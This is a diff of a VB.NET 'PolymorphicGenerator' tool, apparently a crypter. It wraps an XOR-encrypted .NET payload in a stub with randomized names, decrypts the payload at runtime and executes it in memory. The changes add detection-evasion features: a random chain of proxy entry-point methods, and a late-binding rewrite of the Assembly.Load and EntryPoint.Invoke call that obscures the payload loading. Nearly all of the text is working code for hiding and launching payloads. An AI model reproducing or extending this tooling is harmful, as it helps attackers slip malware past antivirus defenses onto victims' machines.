@@ -1,4 +1,4 @@
-﻿'' Coded by DosX
+'' Coded by DosX
 '' GitHub: https://github.com/DosX-dev
 
 Imports System.CodeDom.Compiler
@@ -28,8 +28,8 @@ Module PolymorphicGenerator
                 Select Case argKey
                     Case "help"
                         Console.WriteLine(" --file {path} - specify file name" & vbLf &
-                                          " --flood - add junk classes to file" & vbLf &
-                                          " --proxy - move original entry point to from Main()")
+                                          " --flood - add junk classes to the file" & vbLf &
+                                          " --proxy - proxy the original entry point several times")
                         End
                     Case "file"
                         If i < args.Length - 1 AndAlso Not args(i + 1).StartsWith("--") Then
@@ -102,8 +102,10 @@ Module PolymorphicGenerator
             Console.WriteLine("Number of junk classes: " & numberOfClasses)
         End If
 
+        Dim sizeOfPayload = New FileInfo(payloadName).Length
+
         Console.WriteLine("Generated key:" & vbLf & " | BYTES: " & keyArr.Replace(" ", String.Empty) & vbLf & " | BASE64: " & Convert.ToBase64String(key) & vbLf &
-                          "Payload size: " & New FileInfo(payloadName).Length & " bytes" & vbLf &
+                          "Payload size: " & sizeOfPayload & " bytes" & vbLf &
                           "Key size: " & keyLength & " bytes" & vbLf &
                           "EP proxy: " & If(entryPointProxy, "Enabled", "Disabled"))
 
@@ -111,22 +113,28 @@ Module PolymorphicGenerator
         Dim sourceCode As New StringBuilder
 
         sourceCode.AppendLine($"
+Imports System
 Imports System.IO
-Imports System.Reflection")
+Imports System.Reflection
+Imports System.Runtime.CompilerServices
+Imports Microsoft.VisualBasic.CompilerServices")
 
         sourceCode.AppendLine($"Module {GenerateRandomString()}")
 
         sourceCode.AppendLine($"Sub Main()")
 
         If entryPointProxy Then
-            Dim originalEpName = GenerateRandomString()
+            For x = 0 To rnd.Next(2, 8)
+                Dim originalEpName = GenerateRandomString()
 
-            sourceCode.AppendLine($"
+                ' Proxy methods
+                sourceCode.AppendLine($"
 {originalEpName}()
 End Sub
 
 Sub {originalEpName}
 ")
+            Next
         End If
 
         sourceCode.AppendLine($"Using {streamVarName} As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
@@ -139,13 +147,16 @@ Sub {originalEpName}
 End Sub")
 
         sourceCode.AppendLine($"Sub {injectionSubName}({payloadArgName}) ' injection
-    Assembly.Load({payloadArgName}).EntryPoint.Invoke(Nothing, Nothing)
+    
+    NewLateBinding.LateCall(
+        NewLateBinding.LateGet(NewLateBinding.LateGet(Nothing, Type.GetType(""System.Reflection.Assembly""), ""Load"", New Object() {{ RuntimeHelpers.GetObjectValue({payloadArgName}) }}, Nothing, Nothing, {{ True }}),
+    Nothing, ""EntryPoint"", New Object(-1) {{}}, Nothing, Nothing, Nothing), Nothing, ""Invoke"", New Object() {{ Nothing, Nothing }}, Nothing, Nothing, Nothing, True)
 End Sub
 
 Function {xorFunctionName}({xorInputArgName} As Byte(), {xorKeyArgName} As Byte()) As Byte() ' decryption
-    Dim encryptedArray({xorInputArgName}.Length - 1) As Byte
-    For i As Integer = 0 To {xorInputArgName}.Length - 1
-        encryptedArray(i) = {xorInputArgName}(i) Xor {xorKeyArgName}(i Mod {xorKeyArgName}.Length)
+    Dim encryptedArray({sizeOfPayload - 1}) As Byte
+    For i As Integer = 0 To {sizeOfPayload - 1}
+        encryptedArray(i) = {xorInputArgName}(i) Xor {xorKeyArgName}(i Mod {keyLength})
     Next
     Return encryptedArray
 End Function
@@ -157,7 +168,6 @@ End Module
                 sourceCode.AppendLine($"Class {GenerateRandomString()} : End Class")
             Next
         End If
-
 
         Dim results As CompilerResults = provider.CompileAssemblyFromSource(options, sourceCode.ToString())
 
